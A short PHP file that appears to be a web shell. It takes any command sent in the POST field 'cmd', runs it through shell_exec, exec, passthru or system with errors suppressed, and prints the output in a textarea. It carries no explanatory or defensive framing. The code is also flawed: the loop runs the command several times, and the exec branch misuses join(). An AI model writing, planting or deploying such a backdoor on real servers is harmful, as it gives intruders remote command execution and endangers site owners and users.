<?php
function execmd($cmd)
{
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    foreach($funcs as $safe)
    {        
        if($safe=="exec")
        {
            $ret=@exec($cmd);
            $ret=join("\n",$ret);
        }
        elseif($safe=="system")
            $ret=@system($cmd);
        elseif($safe=="passthru")
            $ret=@passthru($cmd);            
        elseif($safe=="shell_exec")
            $ret=@shell_exec($cmd);       
    }
    return $ret;
}


if(isset($_POST['execmd'])){
	echo "<center><textarea rows='10' cols='100'>";
	echo execmd($_POST['cmd']);
	echo "</textarea></center>";
}
?>